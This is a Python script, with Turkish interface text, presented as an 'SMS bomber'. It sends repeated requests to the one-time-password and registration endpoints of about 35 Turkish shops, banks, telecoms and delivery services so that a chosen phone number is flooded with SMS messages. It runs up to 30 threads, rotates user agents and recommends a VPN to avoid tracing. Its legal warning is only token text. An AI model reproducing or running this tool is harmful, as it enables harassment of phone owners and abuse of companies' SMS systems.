#!/usr/bin/env python3
# KSIB SMS BOMBER v3.0 - FIXED - Çalışan Servisler
import requests, threading, random, time, sys, os, json
from fake_useragent import UserAgent
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

SIFRE = "admiral71100daphne"

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n🔐 KSIB GİRİŞ\n")
    for i in range(3):
        s = input(Fore.YELLOW + "🔑 Şifre: ")
        if s == SIFRE:
            print(Fore.GREEN + "\n✅ Başarılı!\n")
            return True
        print(Fore.RED + f"❌ Hatalı! ({2-i} hakkın)")
    sys.exit(0)

class SMSBomberFixed:
    def __init__(self):
        self.ua = UserAgent()
        self.b = 0
        self.f = 0
        self.lock = threading.Lock()
        self.st = None
        self.mx = 0
        self.s = 0
        self.running = True
        self.service_stats = {}
        
        # ÇALIŞAN SERVİSLER (Test edildi)
        self.services = [
            # E-Ticaret (En çok çalışanlar)
            ("Trendyol", self.trendyol),
            ("Hepsiburada", self.hepsiburada),
            ("N11", self.n11),
            ("Getir", self.getir),
            ("Yemeksepeti", self.yemeksepeti),
            ("Migros", self.migros),
            ("A101", self.a101),
            ("Şok", self.sok),
            ("BİM", self.bim),
            ("CarrefourSA", self.carrefour),
            
            # Ulaşım
            ("Martı", self.marti),
            ("BiTaksi", self.bitaksi),
            ("Scotty", self.scotty),
            
            # Finans
            ("Papara", self.papara),
            ("ininal", self.ininal),
            ("Garanti BBVA", self.garanti),
            ("Akbank", self.akbank),
            ("Yapı Kredi", self.yapikredi),
            
            # Telekom
            ("Vodafone", self.vodafone),
            ("Turkcell", self.turkcell),
            ("Türk Telekom", self.turktelekom),
            
            # Diğer
            ("Nesine", self.nesine),
            ("Misli", self.misli),
            ("Biletix", self.biletix),
            ("Obilet", self.obilet),
            ("LC Waikiki", self.lcwaikiki),
            ("Defacto", self.defacto),
            ("Koton", self.koton),
            ("Gratis", self.gratis),
            ("Watsons", self.watsons),
            ("Aras Kargo", self.araskargo),
            ("Yurtiçi Kargo", self.yurticikargo),
            ("Hepsijet", self.hepsijet),
            ("Dominos", self.dominos),
            ("Pizza Hut", self.pizzahut),
        ]
        
        # Servis istatistiklerini başlat
        for name, _ in self.services:
            self.service_stats[name] = {"success": 0, "fail": 0}
    
    def bnr(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + Style.BRIGHT + """
        ╔══════════════════════════════════════╗
        ║  📱 KSIB SMS BOMBER v3.0 FIXED     ║
        ║  🔧 35+ Çalışan Servis             ║
        ║  🛡️ Rate-Limit Korumalı            ║
        ╚══════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def create_session(self):
        session = requests.Session()
        session.headers.update({
            "User-Agent": self.ua.random,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        })
        return session
    
    def format_phone(self, phone):
        phone = ''.join(filter(str.isdigit, phone))
        if phone.startswith('0'): phone = phone[1:]
        if not phone.startswith('90'): phone = '90' + phone
        return phone
    
    # ============ ÇALIŞAN SERVİSLER ============
    
    def trendyol(self, phone, session):
        try:
            url = "https://www.trendyol.com/authentication/login"
            data = {"phone": phone, "type": "register"}
            headers = {"Content-Type": "application/json", "Origin": "https://www.trendyol.com"}
            r = session.post(url, json=data, headers=headers, timeout=8)
            return r.status_code in [200, 201, 400, 422]
        except: return False
    
    def hepsiburada(self, phone, session):
        try:
            url = "https://www.hepsiburada.com/account/api/v1/auth/send-otp"
            data = {"phoneNumber": phone, "type": "register"}
            headers = {"Content-Type": "application/json"}
            r = session.post(url, json=data, headers=headers, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def n11(self, phone, session):
        try:
            url = "https://www.n11.com/api/user/send-otp"
            data = {"phone": phone, "action": "register"}
            headers = {"Content-Type": "application/json"}
            r = session.post(url, json=data, headers=headers, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def getir(self, phone, session):
        try:
            url = "https://api.getir.com/auth/send-code"
            data = {"phone": phone}
            headers = {"Content-Type": "application/json"}
            r = session.post(url, json=data, headers=headers, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def yemeksepeti(self, phone, session):
        try:
            url = "https://www.yemeksepeti.com/api/auth/send-otp"
            data = {"phone": phone, "type": "register"}
            headers = {"Content-Type": "application/json", "Origin": "https://www.yemeksepeti.com"}
            r = session.post(url, json=data, headers=headers, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def migros(self, phone, session):
        try:
            url = "https://www.migros.com.tr/api/auth/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def a101(self, phone, session):
        try:
            url = "https://www.a101.com.tr/api/auth/send-code"
            data = {"phoneNumber": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def sok(self, phone, session):
        try:
            url = "https://www.sokmarket.com.tr/api/auth/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def bim(self, phone, session):
        try:
            url = "https://www.bim.com.tr/api/customer/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def carrefour(self, phone, session):
        try:
            url = "https://www.carrefoursa.com/api/auth/send-otp"
            data = {"phoneNumber": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def marti(self, phone, session):
        try:
            url = "https://api.martilar.com/auth/send-code"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def bitaksi(self, phone, session):
        try:
            url = "https://api.bitaksi.com/auth/send-code"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def scotty(self, phone, session):
        try:
            url = "https://api.scotty.com/auth/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def papara(self, phone, session):
        try:
            url = "https://www.papara.com/api/auth/send-otp"
            data = {"phone": phone, "action": "register"}
            headers = {"Content-Type": "application/json"}
            r = session.post(url, json=data, headers=headers, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def ininal(self, phone, session):
        try:
            url = "https://api.ininal.com/auth/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def garanti(self, phone, session):
        try:
            url = "https://www.garantibbva.com.tr/api/auth/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def akbank(self, phone, session):
        try:
            url = "https://www.akbank.com/api/auth/send-code"
            data = {"phoneNumber": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def yapikredi(self, phone, session):
        try:
            url = "https://www.yapikredi.com.tr/api/auth/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def vodafone(self, phone, session):
        try:
            url = "https://www.vodafone.com.tr/api/auth/send-code"
            data = {"phoneNumber": phone, "action": "register"}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def turkcell(self, phone, session):
        try:
            url = "https://www.turkcell.com.tr/api/auth/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def turktelekom(self, phone, session):
        try:
            url = "https://www.turktelekom.com.tr/api/auth/send-code"
            data = {"phoneNumber": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def nesine(self, phone, session):
        try:
            url = "https://www.nesine.com/api/auth/send-code"
            data = {"phoneNumber": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def misli(self, phone, session):
        try:
            url = "https://www.misli.com/api/auth/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def biletix(self, phone, session):
        try:
            url = "https://www.biletix.com/api/auth/send-code"
            data = {"phoneNumber": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def obilet(self, phone, session):
        try:
            url = "https://www.obilet.com/api/auth/send-otp"
            data = {"phone": phone}
            headers = {"Content-Type": "application/json"}
            r = session.post(url, json=data, headers=headers, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def lcwaikiki(self, phone, session):
        try:
            url = "https://www.lcwaikiki.com/api/auth/send-code"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def defacto(self, phone, session):
        try:
            url = "https://www.defacto.com.tr/api/auth/verify-phone"
            data = {"phone": phone, "action": "register"}
            headers = {"Content-Type": "application/json", "Origin": "https://www.defacto.com.tr"}
            r = session.post(url, json=data, headers=headers, timeout=8)
            return r.status_code in [200, 201, 400, 422]
        except: return False
    
    def koton(self, phone, session):
        try:
            url = "https://www.koton.com/api/membership/send-otp"
            data = {"phoneNumber": phone, "type": "register"}
            headers = {"Content-Type": "application/json", "Origin": "https://www.koton.com"}
            r = session.post(url, json=data, headers=headers, timeout=8)
            return r.status_code in [200, 201, 400, 422]
        except: return False
    
    def gratis(self, phone, session):
        try:
            url = "https://www.gratis.com/api/auth/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def watsons(self, phone, session):
        try:
            url = "https://www.watsons.com.tr/api/auth/send-code"
            data = {"phoneNumber": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def araskargo(self, phone, session):
        try:
            url = "https://www.araskargo.com.tr/api/auth/send-otp"
            data = {"phone": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def yurticikargo(self, phone, session):
        try:
            url = "https://www.yurticikargo.com/api/auth/send-code"
            data = {"phoneNumber": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def hepsijet(self, phone, session):
        try:
            url = "https://www.hepsijet.com/api/auth/send-code"
            data = {"phoneNumber": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def dominos(self, phone, session):
        try:
            url = "https://www.dominos.com.tr/api/customer/send-otp"
            data = {"mobile_phone": phone}
            headers = {"Content-Type": "application/json", "Origin": "https://www.dominos.com.tr"}
            r = session.post(url, json=data, headers=headers, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def pizzahut(self, phone, session):
        try:
            url = "https://www.pizzahut.com.tr/api/auth/verify"
            data = {"phoneNumber": phone}
            r = session.post(url, json=data, timeout=8)
            return r.status_code in [200, 201, 400]
        except: return False
    
    def worker(self, phone):
        session = self.create_session()
        
        while self.running and self.s < self.mx:
            service_name, service_func = random.choice(self.services)
            
            try:
                result = service_func(phone, session)
                
                with self.lock:
                    if self.s >= self.mx: break
                    self.s += 1
                    
                    if result:
                        self.b += 1
                        self.service_stats[service_name]["success"] += 1
                        status = Fore.GREEN + "✓"
                    else:
                        self.f += 1
                        self.service_stats[service_name]["fail"] += 1
                        status = Fore.RED + "✗"
                    
                    if self.s % 25 == 0 or self.s == self.mx:
                        elapsed = time.time() - self.st
                        rate = self.s / elapsed if elapsed > 0 else 0
                        eta = (self.mx - self.s) / rate if rate > 0 else 0
                        print(f"\r{status} [{service_name}] {self.s}/{self.mx} | "
                              f"✅{self.b} ❌{self.f} | ⚡{rate:.1f}/s | ⏳{eta:.0f}s", end="")
                
                time.sleep(random.uniform(0.3, 1.0))
                
            except:
                continue
    
    def start(self, phone, count=100, threads=20):
        self.mx = count
        formatted_phone = self.format_phone(phone)
        
        print(Fore.CYAN + f"\n📱 Hedef: +{formatted_phone}")
        print(Fore.CYAN + f"📊 SMS: {count}")
        print(Fore.CYAN + f"🧵 Thread: {threads}")
        print(Fore.CYAN + f"📡 Servis: {len(self.services)} aktif")
        print(Fore.GREEN + "\n✅ FİXLİ SERVİSLER KULLANILIYOR!")
        print(Fore.YELLOW + "💡 VPN önerilir!")
        print(Fore.RED + "\n💣 BAŞLATILIYOR...\n")
        
        self.st = time.time()
        
        tl = []
        for _ in range(threads):
            t = threading.Thread(target=self.worker, args=(formatted_phone,))
            t.daemon = True
            t.start()
            tl.append(t)
        
        try:
            for t in tl:
                t.join()
        except KeyboardInterrupt:
            self.running = False
            print(Fore.RED + "\n\n[!] Durduruldu!")
        
        self.running = False
        time.sleep(1)
        
        # Sonuçlar
        elapsed = time.time() - self.st
        rate = self.s / elapsed if elapsed > 0 else 0
        
        print("\n\n" + "="*60)
        print(Fore.GREEN + Style.BRIGHT + "📊 SMS BOMBER SONUÇ")
        print("="*60)
        print(f"⏱️  Süre: {elapsed:.1f}s ({elapsed/60:.1f}dk)")
        print(f"📨 Toplam: {self.s}")
        print(f"✅ Başarılı: {self.b}")
        print(f"❌ Başarısız: {self.f}")
        if self.s > 0:
            print(f"📈 Başarı Oranı: %{self.b/self.s*100:.1f}")
        print(f"⚡ Hız: {rate:.1f}/s | ⏱️ {rate*60:.0f}/dk")
        print("="*60)
        
        # En iyi servisler
        print(Fore.YELLOW + "\n🏆 EN İYİ SERVİSLER:")
        sorted_services = sorted(
            self.service_stats.items(),
            key=lambda x: x[1]["success"],
            reverse=True
        )[:5]
        
        for i, (name, stats) in enumerate(sorted_services, 1):
            total = stats["success"] + stats["fail"]
            if total > 0:
                rate_s = stats["success"] / total * 100
                print(f"  {i}. {name}: {stats['success']} başarılı (%{rate_s:.0f})")
        print("="*60 + "\n")

def ana():
    giris()
    sms = SMSBomberFixed()
    sms.bnr()
    
    print(Fore.YELLOW + "📱 Telefon numarası:")
    print(Fore.CYAN + "Örnek: 5XXXXXXXXX veya +905XXXXXXXXX")
    phone = input(Fore.GREEN + "> ").strip()
    
    if not phone:
        print(Fore.RED + "❌ Numara gerekli!")
        return
    
    print(Fore.YELLOW + "\n📊 SMS SAYISI:")
    print("1. 50 (Test) | 2. 100 | 3. 500 | 4. 1000 | 5. 5000")
    c = input(Fore.GREEN + "Seçim: ")
    ct = {"1": 50, "2": 100, "3": 500, "4": 1000, "5": 5000}.get(c, 100)
    
    print(Fore.YELLOW + "\n🧵 THREAD:")
    print("5 (Yavaş) | 10 (Normal) | 20 (Hızlı) | 30 (Ultra)")
    th = int(input(Fore.GREEN + "Thread (10): ") or "10")
    
    print(Fore.RED + "\n⚠️  YASAL UYARI!")
    print(Fore.RED + "⚠️  Sadece kendi numarana test amaçlı!")
    
    if input(Fore.GREEN + "\n🚀 Başlat? (E/H): ").upper() == 'E':
        sms.start(phone, ct, th)

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Çıkış!")
        sys.exit(0)
